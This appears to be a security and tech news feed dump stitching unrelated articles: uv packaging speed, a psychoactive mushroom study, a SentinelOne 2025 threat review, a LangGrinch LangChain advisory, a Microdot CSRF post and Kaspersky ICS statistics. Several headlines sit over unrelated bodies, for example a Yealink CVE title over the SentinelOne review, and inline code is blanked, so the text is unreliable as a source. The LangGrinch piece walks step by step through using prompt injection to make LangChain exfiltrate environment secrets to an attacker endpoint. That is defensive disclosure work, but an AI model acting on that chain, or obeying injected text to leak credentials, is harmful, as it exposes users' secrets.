The usual explanation is “it’s written in Rust.” That’s true, but it doesn’t explain much. Plenty of tools are written in Rust without being notably fast. The interesting question is what design decisions made the difference.Charlie Marsh’s Jane Street talk and a Xebia engineering deep-dive cover the technical details well. The interesting parts are the design decisions: standards that enable fast paths, things uv drops that pip supports, and optimizations that don’t require Rust at all.The standards that made uv possiblepip’s slowness isn’t a failure of implementation. For years, Python packaging required executing code to find out what a package needed.The problem was setup.py. You couldn’t know a package’s dependencies without running its setup script. But you couldn’t run its setup script without installing its build dependencies. PEP 518 in 2016 called this out explicitly: “You can’t execute a setup.py file without knowing its dependencies, but currently there is no standard way to know what those dependencies are in an automated fashion without executing the setup.py file.”This chicken-and-egg problem forced pip to download packages, execute untrusted code, fail, install missing build tools, and try again. Every install was potentially a cascade of subprocess spawns and arbitrary code execution. Installing a source distribution was essentially  with extra steps.PEP 518 (2016) created pyproject.toml, giving packages a place to declare build dependencies without code execution. The TOML format was borrowed from Rust’s Cargo, which makes a Rust tool returning to fix Python packaging feel less like coincidence.PEP 517 (2017) separated build frontends from backends, so pip didn’t need to understand setuptools internals.PEP 621 (2020) standardized the  table, so dependencies could be read by parsing TOML rather than running Python.PEP 658 (2022) put package metadata directly in the Simple Repository API, so resolvers could fetch dependency information without downloading wheels at all.PEP 658 went live on PyPI in May 2023. uv launched in February 2024. uv could be fast because the ecosystem finally had the infrastructure to support it. A tool like uv couldn’t have shipped in 2020. The standards weren’t there yet.Other ecosystems figured this out earlier. Cargo has had static metadata from the start. npm’s package.json is declarative. Python’s packaging standards finally bring it to parity.Speed comes from elimination. Every code path you don’t have is a code path you don’t wait for. Eggs were the pre-wheel binary format. pip still handles them; uv doesn’t even try. The format has been obsolete for over a decade. uv ignores pip’s configuration files entirely. No parsing, no environment variable lookups, no inheritance from system-wide and per-user locations.No bytecode compilation by default. pip compiles .py files to .pyc during installation. uv skips this step, shaving time off every install. You can opt in if you want it.Virtual environments required. pip lets you install into system Python by default. uv inverts this, refusing to touch system Python without explicit flags. This removes a whole category of permission checks and safety code.Stricter spec enforcement. pip accepts malformed packages that technically violate packaging specs. uv rejects them. Less tolerance means less fallback logic.Ignoring requires-python upper bounds. When a package says it requires , uv ignores the upper bound and only checks the lower. This reduces resolver backtracking dramatically since upper bounds are almost always wrong. Packages declare  because they haven’t tested on Python 4, not because they’ll actually break. The constraint is defensive, not predictive.First-index wins by default. When multiple package indexes are configured, pip checks all of them. uv picks from the first index that has the package, stopping there. This prevents dependency confusion attacks and avoids extra network requests.Each of these is a code path pip has to execute and uv doesn’t.Optimizations that don’t need RustSome of uv’s speed comes from Rust. But not as much as you’d think. Several key optimizations could be implemented in pip today:HTTP range requests for metadata.Wheel files are zip archives, and zip archives put their file listing at the end. uv tries PEP 658 metadata first, falls back to HTTP range requests for the zip central directory, then full wheel download, then building from source. Each step is slower and riskier. The design makes the fast path cover 99% of cases. None of this requires Rust. pip downloads packages one at a time. uv downloads many at once. Any language can do this.Global cache with hardlinks. pip copies packages into each virtual environment. uv keeps one copy globally and uses hardlinks (or copy-on-write on filesystems that support it). Installing the same package into ten venvs takes the same disk space as one. Any language with filesystem access can do this. pip needs Python running to do anything, and invokes build backends as subprocesses to get metadata from legacy packages. uv parses TOML and wheel metadata natively, only spawning Python when it hits a setup.py-only package that has no other option. uv uses the PubGrub algorithm, originally from Dart’s pub package manager. Both pip and PubGrub use backtracking, but PubGrub applies conflict-driven clause learning from SAT solvers: when it hits a dead end, it analyzes why and skips similar dead ends later. This makes it faster on complex dependency graphs and better at explaining failures. pip could adopt PubGrub without rewriting in Rust.Where Rust actually mattersSome optimizations do require Rust:Zero-copy deserialization. uv uses rkyv to deserialize cached data without copying it. The data format is the in-memory format. Libraries like FlatBuffers achieve this in other languages, but rkyv integrates tightly with Rust’s type system.Thread-level parallelism. Python’s GIL forces parallel work into separate processes, with IPC overhead and data copying. Rust can parallelize across threads natively, sharing memory without serialization boundaries. This matters most for resolution, where the solver explores many version combinations. Every time pip spawns a subprocess, it pays Python’s startup cost. uv is a single static binary with no runtime to initialize.Compact version representation. uv packs versions into u64 integers where possible, making comparison and hashing fast. Over 90% of versions fit in one u64. This is micro-optimization that compounds across millions of comparisons.These are real advantages. But they’re smaller than the architectural wins from dropping legacy support and exploiting modern standards.uv is fast because of what it doesn’t do, not because of what language it’s written in. The standards work of PEP 518, 517, 621, and 658 made fast package management possible. Dropping eggs, pip.conf, and permissive parsing made it achievable. Rust makes it a bit faster still.pip could implement parallel downloads, global caching, and metadata-only resolution tomorrow. It doesn’t, largely because backwards compatibility with fifteen years of edge cases takes precedence. But it means pip will always be slower than a tool that starts fresh with modern assumptions.Other package managers could learn from this: static metadata, no code execution to discover dependencies, and the ability to resolve everything upfront before downloading. Cargo and npm have operated this way for years. If your ecosystem requires running arbitrary code to find out what a package needs, you’ve already lost.]]></content:encoded></item><item><title>Experts explore new mushroom which causes fairytale-like hallucinations</title><link>https://nhmu.utah.edu/articles/experts-explore-new-mushroom-which-causes-fairytale-hallucinations</link><author>astronads</author><category>dev</category><pubDate>Fri, 26 Dec 2025 17:07:53 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Picture this: You're enjoying a delicious bowl of mushroom soup, when suddenly you notice hundreds of tiny people dressed in cartoonish clothing marching across your tablecloth, jumping into your bowl, swimming around, and clinging to your spoon as you lift it for another taste. You're not dreaming — you've just experienced the effects of a mushroom known scientifically as . It belongs to an entirely different class of Fungi than the more commonly known “magic mushrooms” and remains far more mysterious.When outsiders first embarked into the Western Highlands of Papua New Guinea in 1934, they encountered a perplexing sight: after consuming a type of wild mushroom which they called “nonda,” the local people would appear to go temporarily insane, exhibiting a sudden and striking change in mood and behavior. Subsequent accounts of the “mushroom madness” phenomenon, as it was termed, provided more details into the mushroom's strange psychological effects.Specifically, it was reported that those affected would experience lilliputian hallucinations — a rare, clinically defined psychiatric syndrome (named after the tiny people in Gulliver's Travels) characterized by the perception of numerous little people autonomously moving about and interacting in the real-world environment. One elder tribesman in Papua New Guinea describes this effect, explaining how “he saw tiny people with mushrooms around their faces. They were teasing him, and he was trying to chase them away.”By the 1960s, scientists were working to identify the species of mushrooms involved and what chemicals within them might be responsible for such bizarre effects. However, both questions have remained unanswered to this day. As a Ph.D. student at the Natural History Museum of Utah, I've been working to solve this puzzle: What exactly is the identity of this mushroom, how widespread is the cultural knowledge of its effects, and why does it produce such fantastical visions?Investigating Lilliputian Mushrooms in ChinaHome to 40 percent of the world's wild edible fungi, Yunnan, China has always been remarkable for mushroom lovers. But in the last decade or so, the summer rains have brought more than just mushrooms; they’ve been accompanied by an explosion of news articles that read like something out of children's fairy tales: after consuming a popular wild mushroom known locally as “Jian shou qing,” locals frequently report having unbelievably bizarre experiences, most notable characterized by seeing “xiao ren ren,” or little people.A professor in Yunnan recounted how one evening during dinner (Jian shou qing is openly sold in markets and restaurants), he began seeing swirling shapes and colors after eating stir-fried mushrooms. Since the psychoactive effects are familiar to most locals, he began looking for xiao ren ren but was disappointed to find none — until he lifted the tablecloth and peeked underneath, seeing “hundreds of xiao ren ren, marching like soldiers.”Even more curious, he said, “when I lifted the tablecloth higher, the heads came off and stuck to the bottom of the cloth and the bodies kept marching in place… I did this many times, at two-minute intervals, and each time they were there, marching and grinning… I measured them, too… they were 2 cm high.” According to records at Yunnan Hospital, 96 percent of patients affected by this mushroom report seeing an abundance of "little people" or "elves," often dancing, jumping, or marching around their real-world environment.As recently as 2014, the taxonomic identity of the psychoactive Jian shou qing mushroom remained unknown. It wasn’t until mycologists in Yunnan purchased and sequenced the mushrooms being sold in an open-air street market (where it had been sold for decades) that the species was officially described and recognized as being new to science. Its formal Latin name is , and, interestingly, it’s more closely related to the common porcini (Utah’s official state mushroom) than to any other currently known hallucinogenic mushroom species.Although is a recent scientific discovery, the knowledge and use of this psychoactive mushroom may have much deeper ancient roots in Chinese culture. A prominent Daoist text from the 3rd century CE refers to a “flesh spirit mushroom,” which, according to the text, if consumed raw, allows one to “see a little person” and “attain transcendence immediately.”Surprisingly, I became aware of yet another independent report of the exact same phenomenon — a mushroom that caused lilliputian hallucinations, but this time from an entirely different region of the world. Indigenous communities in the Philippines' remote Northern Cordillera were collecting and consuming a wild mushroom which, according to local knowledge, occasionally evokes visions of little people, which they call the “ansisit.” The mushroom is known locally as "Sedesdem." Just as the “Nonda” in Papua New Guinea and “Jian shou qing” in Yunnan, it is a culturally esteemed wild edible mushroom that, if undercooked, produces bizarre yet remarkably consistent psychoactive effect.As no scientific surveys of the mushrooms in the Northern Philippines had been conducted, Sedesdem’s taxonomic identity remained unknown, leaving me with the obvious task. I travelled to this community in 2024 to explore the mushrooms and experience the culture surrounding this phenomenon. By working with local guides and foraging through the forest, we collected samples that are now preserved for scientific study at the Natural History Museum of Utah — allowing us to perform the first DNA sequencing of this region's fungi.What surprised me most was the unexpected discovery of the Sedesdem mushroom’s identity: it was none other than , the exact same species as in Yunnan. The puzzle was coming together.More Than Folklore or Tall TalesThat the same peculiar hallucinations are independently reported across such distant cultures indicates that these bizarre psychological effects are not cultural fabrications or coincidences, but manifestations of a shared underlying chemical and neurological basis.Chemical and genomic analyses performed on at the Natural History Museum of Utah have revealed no traces of any known psychoactive compounds, suggesting that something entirely new is waiting to be discovered. In other words,  appears to harbor a chemical compound capable of reliably evoking this unusual experience of lilliputian hallucinations. The discovery of that chemical may, in fact, hold the key to understanding one of the most mysterious dimensions of the human psyche.Ongoing Research Into the Fairytale MushroomOur efforts to identify this compound are ongoing, and the progress so far has been exciting!  When mice are given chemical extracts of , their behavior shifts noticeably compared to controls. By continuing to fractionate these extracts and testing each in turn, we’ve been steadily narrowing in on isolating the specific bioactive molecules involved.But the chemistry is only part of the mystery. In parallel, I’m building a global database of all  species. In doing so, I’ve discovered four new species previously unknown to science. Through full-genome sequencing, I’ve been able to clearly map the evolutionary relationships and history of  for the first time, allowing us to search for patterns that might reveal where and why psychoactivity evolved in this group. For example, genomic analysis reveals that the closest relative of  is a species commonly found (though rarely eaten) here in North America. While there are no reports of it being psychoactive in the US, it’s entirely plausible its effects have simply gone unnoticed.Exciting Discoveries Are Waiting for UsI’m fascinated by how far the knowledge of these mushrooms extends, across both space and time. Are there additional cultural traditions and groups surrounding this psychoactive species that have yet to be documented? Does humanity’s knowledge of this mushroom and its most bizarre effects stretch further into history, and deeper into folkloric beliefs, that we currently appreciate? Given the remarkable findings we’ve made in just the past few years, I believe the answer to both these questions is yes.While many questions remain, one thing is for certain:  reminds us that the world of mushrooms, even those found in markets and on dinner plates, conceals mysteries and wonders we’ve yet to imagine. Somewhere between traditional folklore and modern biology, between the wild forest floor and the sterile scientific laboratory, lies a story still unfolding, a story that may begin with something as seemingly innocuous as a bowl of mushroom soup.]]></content:encoded></item><item><title>CVE-2025-66738 - Yealink T21P_E2 Phone Remote Code Execution</title><link>https://cvefeed.io/vuln/detail/CVE-2025-66738</link><author></author><category>vulns</category><pubDate>Fri, 26 Dec 2025 16:15:44 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-66738

From high-profile arrests to major asset seizures, .In the last two weeks, Eurojust led a takedown of Ukrainian call centers defrauding Europeans of €10M and law enforcement seizing servers from E-Note crypto exchange laundering $70M through ransomware and account takeovers. Similarly, the arrest of Ukrainian national Victoria Dubranova for aiding Russian state-backed hacktivists, alongside Spanish authorities capturing a 19-year-old selling 64M stolen records, underscores the growing international effort to hold cybercriminals accountable.Significant infrastructure disruptions further amplify these successes. Convictions of cybercriminals targeting sensitive systems, such as the prison sentence for the “evil twin” WiFi hacker and seizure of the Cryptomixer crypto mixer with €1.3B laundered since 2016, are tangible results in stopping large-scale fraud.  to arrest Russian and DPRK-related cybercriminals and place sanctions on bulletproof hosting providers and foreign actors.International coordination has also been key this year. Interpol’s massive operations across Africa, including Operation Serengeti 2.0 and Operation Red Card, led to the arrests of thousands of suspects and the seizure of tens of millions in stolen assets. Europol dismantled SIMCARTEL, a global SIM-box fraud network, seizing servers, SIM cards, crypto, and luxury vehicles, while coordinated actions targeted Diskstation ransomware gangs and hacktivist infrastructures. In parallel, DOJ and CISA-led operations disrupted high-value schemes, including Prince Group’s $15B romance scam and multiple ransomware networks, while releasing decryptors for Phobos and 8Base victims to provide tangible relief. , introducing the Cyber Trust Mark certification for IoT devices and HIPAA encryption and MFA updates to ensure cyber safety from the top down.On the cybersecurity innovation front, CISA’s launch of Thorium, an open-source platform to help government agencies automate forensic investigations, and AI-enabled threat detection systems have allowed authorities to act on incidents more rapidly, from ransomware affiliate seizures to monitoring AI misuse..North Korea’s DPRK-linked hackers were prolific throughout 2025, stealing over $2B in cryptocurrency, blending traditional heists with espionage campaigns like Operation Contagious Interview targeting remote workers. Similarly, Iranian-linked UNK_SmudgedSerpent and China-linked TA415 campaigns leveraged phishing, fake platforms, and developer tooling to compromise high-value targets, from policy experts to enterprise networks.. VS Code extensions like Bitcoin Black and Codo AI exfiltrated credentials from crypto wallets, while NPM packages such as XORIndex and os-info-checker-es6 delivered multi-stage payloads. Novel malware families including SleepyDuck RAT and Betruger backdoors emerged, masquerading as popular extensions on the Open VSX open-source registry and supporting ransomware campaigns, respectively. Even AI-powered attacks emerged, with AkiraBot, Gamma AI phishing, and social engineering campaigns bypassing CAPTCHAs and traditional defenses to exploit SMBs and enterprise targets.State-aligned and nation-state threat actors also pursued espionage alongside financial crime. Fake job schemes and AI/crypto talent lures enabled targeted malware deployment, while advanced persistent threats like UNC3886 delivered stealthy backdoors to corporate and diplomatic networks. .The “Ugly” dimension of 2025 was . Large ransomware operations like CyberVolk resurfaced with AI-driven VolkLocker, automating negotiation, phishing, and multilingual attacks while leveraging Telegram for orchestration. AI also enhanced the capabilities of smaller, fragmented ransomware crews, allowing rapid targeting and payload deployment, though operational flaws sometimes limited effectiveness.Zero-day vulnerabilities were actively exploited across critical infrastructure and enterprise platforms. React2Shell in React/Next.js, Triofox (CVE-2025-12480), Oracle E-Business Suite (CVE-2025-61884), and ToolShell in SharePoint permitted full system compromise, highlighting that popular frameworks and business-critical software remain high-value targets. Cloud and AI services were similarly exploited; EchoLeak and Google Gemini LLM prompt injections enabled exfiltration of sensitive information without user interaction. .. Iranian-backed Crimson Sandstorm leveraged cyber reconnaissance to support missile strikes, while Chinese and DPRK actors continue to target aid operations, humanitarian NGOs, and government infrastructure, often exploiting IoT, industrial control systems, or open-source software to do so. In cross-border campaigns, long-dwell malware like BRICKSTORM and protocol-level exploits such as MadeYouReset created cascading impacts across critical networks and infrastructure.The risk factor in many attacks this year were amplified by third-party risks. Breaches of Discord vendors, Mixpanel, and GitHub Actions exposed vast quantities of PII and credentials, enabling subsequent ransomware, phishing, or espionage campaigns. .As 2025 draws to a close, one thing is clear: Cybersecurity has become more interconnected, more consequential, and more dependent on collective responsibility than ever before. From supply chain fragility and identity-based intrusion to the continued convergence of cybercrime and geopolitics, the challenges ahead demand deeper collaboration, stronger accountability, and a more deliberate approach to trust across the digital ecosystem.From all of us here at SentinelOne, we wish you a happy, healthy, and secure New Year 2026!]]></content:encoded></item><item><title>IoT Hack</title><link>https://www.schneier.com/blog/archives/2025/12/iot-hack.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 26 Dec 2025 12:02:54 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Someone hacked an Italian ferry.It looks like the malware was installed by someone on the ferry, and not remotely.]]></content:encoded></item><item><title>LangGrinch: A Bug in the Library, A Lesson for the Architecture</title><link>https://amlalabs.com/blog/langgrinch-cve-2025-68664/</link><author>/u/hfti</author><category>netsec</category><pubDate>Fri, 26 Dec 2025 10:37:36 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[On December 23, LangChain published a critical advisory for CVE-2025-68664, nicknamed “LangGrinch.” The Cyata research team discovered a serialization bug in langchain-core that enabled secret exfiltration and arbitrary object instantiation. CVSS 9.3. Patch now if you haven’t.The bug itself was straightforward: LangChain’s  function didn’t escape user-controlled dictionaries containing a reserved  key. When that data later passed through , the deserializer treated attacker-shaped data as internal framework structure.This is a coding mistake. Missing input escaping.But the severity—environment variable exfiltration, including API keys and secrets—came from something else entirely: the framework had ambient access to credentials.Here’s the code path that made this bug catastrophic:The  parameter was  by default. Any deserialized object could resolve environment variables. Combined with the serialization bug, an attacker could:Inject a crafted payload via prompt injection (shaping  or )Let normal framework operations serialize and deserialize that payloadInstantiate , which makes an HTTP request on constructionPopulate an HTTP header with any environment variableExfiltrate secrets to an attacker-controlled endpointThe attacker never directly accessed secrets. They tricked the framework into accessing secrets on their behalf.The Bug vs. The Blast RadiusThe bug was the missing escaping. That’s fixable. LangChain fixed it.The blast radius came from architecture.The serialization bug was the entry point. But an entry point into what? Into a layer that could resolve , , database passwords—anything in the environment.If that layer had no access to secrets, the bug would still exist. Object instantiation might still happen. But the attacker would exfiltrate… nothing.Operating systems learned this lesson decades ago.A bug in a user-space application can crash that application. It cannot directly access kernel memory or hardware because a boundary enforces separation. The application must make a syscall, and the kernel validates before granting access.Now consider the LangChain architecture:LLM output flows directly into framework internals that have ambient access to credentials. No kernel. No boundary. No mediation.When the deserialization got confused by attacker-shaped data, secrets were right there to steal.What Credential Isolation Looks LikeThe alternative architecture separates the agent layer from credential access:The agent layer has no environment variables containing secrets wouldn’t work because there are no secrets in the envTo access a credential, the agent presents a capability token to the gatewayThe gateway verifies the token’s scope before retrieving the credentialEven if the serialization bug happens, the attacker exfiltrates nothingThe bug still exists. The fix is still needed. But the blast radius collapses from “exfiltrate any secret” to “instantiate objects with no sensitive access.”LangChain’s patch introduced several breaking changes: Added escaping for  keys in user-controlled dataRestricted deserialization: New  parameter defaults to Disabled ambient secrets: now defaults to  Jinja2 templates now blocked by defaultThe third change is architecturally significant. It’s an acknowledgment that ambient secret access at the framework layer is dangerous. Better to require explicit opt-in than to assume the framework should resolve credentials by default.This is directionally correct. It doesn’t fully isolate credentials—they’re still in the environment, just not auto-resolved. But it reduces the attack surface.Cyata’s writeup makes this point explicitly:LLM output is an untrusted input. If your framework treats portions of that output as structured objects later, you must assume attackers will try to shape it.This is the architectural lesson. LLM outputs can be influenced by prompt injection. Those outputs flow through framework internals—serialization, caching, streaming, message history. If those internals have access to secrets, prompt injection becomes credential theft.The most common attack vector runs through LLM response fields like  or , which can be shaped via prompt injection and then serialized/deserialized in streaming operations. These fields bridge untrusted LLM output and trusted framework internals.Treating these fields as untrusted is good advice. But it’s defense in depth, not a security boundary. Developers must remember to treat data as untrusted. Code must be audited for every path where untrusted data might touch sensitive operations.A security boundary works differently. It doesn’t ask developers to remember. It makes certain access structurally impossible without proper authorization.LangChain is well-maintained. This bug sat in a heavily-used codebase for two and a half years. Serialization edge cases are notoriously hard to catch. As researcher Yarden Porat noted: “It’s much easier to spot something wrong than to notice something missing, especially when you’re auditing , not .”The question isn’t “how do we prevent all bugs?” It’s “when a bug happens, what can the attacker reach?”If credentials live at the same layer as untrusted data processing, the answer is: everything.If credentials live behind a security boundary, the answer is: only what the compromised layer was authorized to access, which should be nothing sensitive.If you’re running LangChain:Upgrade to  or  immediatelyNote: LangChain.js has a similar vulnerability (CVE-2025-68665, CVSS 8.6)Audit any use of Review flows where LLM output gets serialized/deserializedIf you’re building agent infrastructure:Don’t put credentials in environment variables accessible to the agent layerMediate sensitive operations through a gateway that validates authorizationTreat LLM output as untrusted input at every integration pointIf you’re designing agent architectures:Separate the layers that process untrusted data from the layers that access credentialsBuild the boundary now, before a CVE forces you to retrofit itThanks to the Cyata research team for the detailed writeup and responsible disclosure.

And I did start along this tedious route. But then I bumped into a new way some people are dealing with CSRF attacks that is way simpler, which I describe below.Implementing a security featureAn often shared piece of advice is that you should never implement security features yourself. Instead, you should look for well established solutions built by people who think about security day in and day out.Unfortunately, as the lead (and only) maintainer of Microdot, I do not have an ecosystem of existing solutions available to me. Even though I gladly accept external contributions, most of the framework has been built by myself out of nothing. So in this case, like many other times before, I felt I had no choice but to go against the standard advice and write CSRF protection code by myself, because if I didn't do it then the feature would not be built.What is the first step when you need to build a security feature? Check out what OWASP has to say about the matter.So, in early November, I opened OWASP's CSRF Prevention Cheat Sheet page to see what was new and interesting in the world of CSRF protection. And I found that nothing of significance had changed.According to OWASP, the best CSRF protection you could get (at the time I checked) was still built around the idea of using anti-CSRF tokens. So I set off to implement this for Microdot.A disturbance in the (CSRF) forceI was happily making progress on my CSRF implementation, and then in early December, another random Internet user dropped an issue on the Flask repository, proposing that Flask adds support for "modern" CSRF protection. Modern? How could there be a new way to protect against CSRF that isn't mentioned by OWASP?This led me down a rabbit hole of blog posts and discussions spanning the Go and Ruby communities, plus a long discussion about this method on the OWASP GitHub repository itself, resulting in a pull request that added a mention of this method to the CSRF Cheat Sheet, only a couple of weeks after I went to this page looking for guidance for my own implementation.The so called "modern" method to protect against CSRF attacks is based on the Sec-Fetch-Site header, which all modern desktop and mobile browsers include in the requests they send to servers. According to Mozilla, all browsers released since March 2023 have support for this header.The  header can have one of four values:, when the request comes from the same origin as the target server, when the request comes from the same site, but not exactly the same origin (e.g. a different subdomain) as the target server, when the request comes from an origin that does not match the target server, when the request is originated by the userThe value of this header cannot be set via JavaScript, so the server can assume that a) if this header is present, then the client is a web browser, and b) the value of the header can be trusted. So basically, the server can reject requests that come with this header set to , and in essence that is all you need to do to protect against CSRF!After seeing this, I paused my work on the token-based CSRF implementation and spent a few hours to implement this modern approach. As always, the devil is in the details, so let's see what else I needed to do to build a complete solution.First of all, in some cases subdomains sharing the same registered domain may operate independently, and as such, it is not out of the question that one subdomain may attempt to attack another through CSRF. Depending on the level of trust an application has for other subdomains, a server may want to block requests that come with the  header set to . In Microdot, I have added an argument  to cover this case. I decided to err on the side of security, so the default is , meaning that requests from subdomains are also blocked.The other big problem is that not everyone is using a recent browser that implements this header. Looking at the browser compatibility for the  header, you can see that most browsers implemented this feature long ago, between 2019 and 2021, with one notable exception: Safari. Apple added this header to its browser in 2023, so it is reasonable to assume that there are still users out there running older browsers that do not support it.One option is to reject all requests that do not have the  header. This keeps everyone secure, but of course, there's going to be some unhappy users of old devices that will not be able to use your application. Plus, this would also reject HTTP clients that are not browsers. If this is not a problem for your use case, then great, but it isn't a good solution overall.From what I gathered from looking at other implementations of this method, an accepted solution is to use the  header as fallback when  is not implemented, since this header has been around for much longer. The last of the major browsers to add it were Firefox desktop in 2019 and Edge and Firefox mobile in 2020. Like , the  header is also a restricted header that is set by the browser, so it can also be used to determine from where a request is coming from.The problem with using the  header is that it isn't always easy to know what is the correct origin that applies to a web application. The standard option is to compare the value of the  header against the value of the  header, but  only includes the hostname and port, while  also includes the scheme. Also, the  header is overwritten as it passes through reverse proxies. So comparing these two headers is actually not easy.Another, more direct option is to ask the user to configure the expected origin name explicitly. To keep things simple, in Microdot I opted for the explicit configuration, for which I linked to the existing Cross-Origin Request Sharing (CORS) support. The CORS feature already maintains a list of allowed origins, so my CSRF logic automatically trusts these. I decided to not complicate myself adding support for  header checks at this time, but maybe I'll add this in the future.Filippo Valsorda, a security developer active in the Go ecosystem (and author of the popular mkcert tool) wrote a blog post about this method that you may want to check out if you want to learn more details about it. He seems to be the first to propose this method and has implemented it for the Go standard library.Also if you are interested, feel free to review my implementation of CSRF protection in Microdot. Have a look at the documentation, the code and an example, and let me know if you have any improvements or fixes to suggest.Note: this section is now out of date. As of December 24th 2025 the OWASP CSRF Cheat Sheet page lists the Fetch Metadata method as a complete solution that can be used as an alternative to token-based approaches.As I mentioned above, the CSRF Prevention Cheat Sheet page from OWASP was updated in early December to include the use of the  header in the list of prevention methods. But this method is currently listed as a defense in depth mechanism, and not a complete solution, which I thought was odd.I referenced the discussion in the OWASP GitHub repository that resulted in the recent changes made to the Cheat Sheet page. Several participants in that discussion have suggested that this method should be upgraded to a complete alternative to the standard token-based approaches. The OWASP maintainer was initially skeptical, but towards the end of the thread they have agreed. The pull request that closed the discussion added this solution as an alternative to the token-based approaches, but then a later change made significant updates, including the downgrade to defense in depth. My hope is that this is just a misunderstanding, and that the OWASP folks will restore the content as it was agreed by all the parties involved.In any case, I consider that in Microdot, going from no CSRF support at all to this is a great step forward that is also consistent with the minimalist ethos of the project. I will be keeping an eye on the OWASP CSRF Cheat Sheet page to see what is their final word on this new protection method, and if they end up keeping it as defense in depth, I still have a mostly complete implementation of double-submit anti-CSRF tokens that I can bring into my project.What I like the most about working in open source is that all the work happens in the open, so it is a permanent record that can be searched and reviewed. My CSRF protection journey started as a somewhat tedious exercise in the use of cryptography and cookies, but then thanks to an unexpected lead it turned into a fun and exciting learning opportunity for me.]]></content:encoded></item><item><title>Net-SNMP Vulnerability Enables Buffer Overflow and the Daemon to Crash</title><link>https://cybersecuritynews.com/net-snmp-vulnerability/</link><author></author><category>security</category><pubDate>Thu, 25 Dec 2025 10:25:40 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

This is the lowest level for the observed period.Percentage of ICS computers on which malicious objects were blocked, Q3 2022–Q3 2025Regionally, the percentage of ICS computers on which malicious objects were blocked ranged from 9.2% in Northern Europe to 27.4% in Africa.Regions ranked by percentage of ICS computers on which malicious objects were blockedIn Q3 2025, the percentage increased in five regions. The most notable increase occurred in East Asia, triggered by the local spread of malicious scripts in the OT infrastructure of engineering organizations and ICS integrators.Changes in the percentage of ICS computers on which malicious objects were blocked, Q3 2025The biometrics sector traditionally led the rankings of the industries and OT infrastructures surveyed in this report in terms of the percentage of ICS computers on which malicious objects were blocked.Rankings of industries and OT infrastructures by percentage of ICS computers on which malicious objects were blockedIn Q3 2025, the percentage of ICS computers on which malicious objects were blocked increased in four of the seven surveyed industries. The most notable increases were in engineering and ICS integrators, and manufacturing.Percentage of ICS computers on which malicious objects were blocked in selected industriesDiversity of detected malicious objectsIn Q3 2025, Kaspersky protection solutions blocked malware from 11,356 different malware families of various categories on industrial automation systems.Percentage of ICS computers on which the activity of malicious objects of various categories was blockedIn Q3 2025, there was a decrease in the percentage of ICS computers on which denylisted internet resources and miners of both categories were blocked. These were the only categories that exhibited a decrease.Depending on the threat detection and blocking scenario, it is not always possible to reliably identify the source. The circumstantial evidence for a specific source can be the blocked threat’s type (category).The internet (visiting malicious or compromised internet resources; malicious content distributed via messengers; cloud data storage and processing services and CDNs), email clients (phishing emails), and removable storage devices remain the primary sources of threats to computers in an organization’s technology infrastructure.In Q3 2025, the percentage of ICS computers on which malicious objects from various sources were blocked decreased.Percentage of ICS computers on which malicious objects from various sources were blockedThe same computer can be attacked by several categories of malware from the same source during a quarter. That computer is counted when calculating the percentage of attacked computers for each threat category, but is only counted once for the threat source (we count unique attacked computers). In addition, it is not always possible to accurately determine the initial infection attempt. Therefore, the total percentage of ICS computers on which various categories of threats from a certain source were blocked can exceed the percentage of threats from the source itself.The main categories of threats from the internet blocked on ICS computers in Q3 2025 were malicious scripts and phishing pages, and denylisted internet resources. The percentage ranged from 4.57% in Northern Europe to 10.31% in Africa.The main categories of threats from email clients blocked on ICS computers were malicious scripts and phishing pages, spyware, and malicious documents. Most of the spyware detected in phishing emails was delivered as a password-protected archive or a multi-layered script embedded in an office document. The percentage of ICS computers on which threats from email clients were blocked ranged from 0.78% in Russia to 6.85% in Southern Europe.The main categories of threats that were blocked when removable media was connected to ICS computers were worms, viruses, and spyware. The percentage of ICS computers on which threats from this source were blocked ranged from 0.05% in Australia and New Zealand to 1.43% in Africa.The main categories of threats that spread through network folders were viruses, AutoCAD malware, worms, and spyware. The percentages of ICS computers where threats from this source were blocked ranged from 0.006% in Northern Europe to 0.20% in East Asia.Typical attacks blocked within an OT network are multi-step sequences of malicious activities, where each subsequent step of the attackers is aimed at increasing privileges and/or gaining access to other systems by exploiting the security problems of industrial enterprises, including technological infrastructures.Malicious objects used for initial infectionIn Q3 2025, the percentage of ICS computers on which denylisted internet resources were blocked decreased to 4.01%. This is the lowest quarterly figure since the beginning of 2022.Percentage of ICS computers on which denylisted internet resources were blocked, Q3 2022–Q3 2025Regionally, the percentage of ICS computers on which denylisted internet resources were blocked ranged from 2.35% in Australia and New Zealand to 4.96% in Africa. Southeast Asia and South Asia were also among the top three regions for this indicator.The percentage of ICS computers on which malicious documents were blocked has grown for three consecutive quarters, following a decline at the end of 2024. In Q3 2025, it reached 1,98%.Percentage of ICS computers on which malicious documents were blocked, Q3 2022–Q3 2025The indicator increased in four regions: South America, East Asia, Southeast Asia, and Australia and New Zealand. South America saw the largest increase as a result of a large-scale phishing campaign in which attackers used new exploits for an old vulnerability (CVE-2017-11882) in Microsoft Office Equation Editor to deliver various spyware to victims’ computers. It is noteworthy that the attackers in this phishing campaign used localized Spanish-language emails disguised as business correspondence.In Q3 2025, the percentage of ICS computers on which malicious scripts and phishing pages were blocked increased to 6.79%. This category led the rankings of threat categories in terms of the percentage of ICS computers on which they were blocked.Percentage of ICS computers on which malicious scripts and phishing pages were blocked, Q3 2022–Q3 2025Regionally, the percentage of ICS computers on which malicious scripts and phishing pages were blocked ranged from 2.57% in Northern Europe to 9.41% in Africa. The top three regions for this indicator were Africa, East Asia, and South America. The indicator increased the most in East Asia (by a dramatic 5.23 pp) as a result of the local spread of malicious spyware scripts loaded into the memory of popular torrent clients including MediaGet.Malicious objects used to initially infect computers deliver next-stage malware — spyware, ransomware, and miners — to victims’ computers. As a rule, the higher the percentage of ICS computers on which the initial infection malware is blocked, the higher the percentage for next-stage malware.
